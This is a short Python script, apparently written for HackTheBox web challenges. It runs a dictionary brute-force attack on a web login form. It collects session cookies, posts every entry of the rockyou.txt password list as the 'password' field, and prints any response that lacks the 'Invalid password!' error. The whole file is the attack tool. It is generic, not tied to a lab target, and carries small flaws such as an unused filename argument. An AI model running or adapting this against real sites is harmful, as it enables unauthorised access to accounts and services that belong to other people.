# -*- coding: utf-8 -*-
#hackthebox web challenges script
import requests
import sys
def getPage(URL):
	req = requests.get(URL)
	return req.cookies
def CreateList(FILENAME):
	password = open("rockyou.txt", "r",encoding='utf-8', errors='ignore')
	passwordList=password.read().split("\n")

	return passwordList

def postString(URL,PASSWORDLIST,COOKIES):
	ERR_STR="Invalid password!"
	for x in PASSWORDLIST:
		DATA={"password":x}
		post_request=requests.post(URL,cookies=COOKIES,data=DATA)
		print(post_request.status_code)
		print("Trying : " + x)
		if ERR_STR not in post_request.text:
			print(post_request.text)
	return post_request.text

if __name__ == '__main__':
	paswdList=CreateList("rockyou.txt")
	URL="URLLLLLLLLLLLLL"
	cookie=getPage(URL)
	postString(URL,paswdList,cookie)
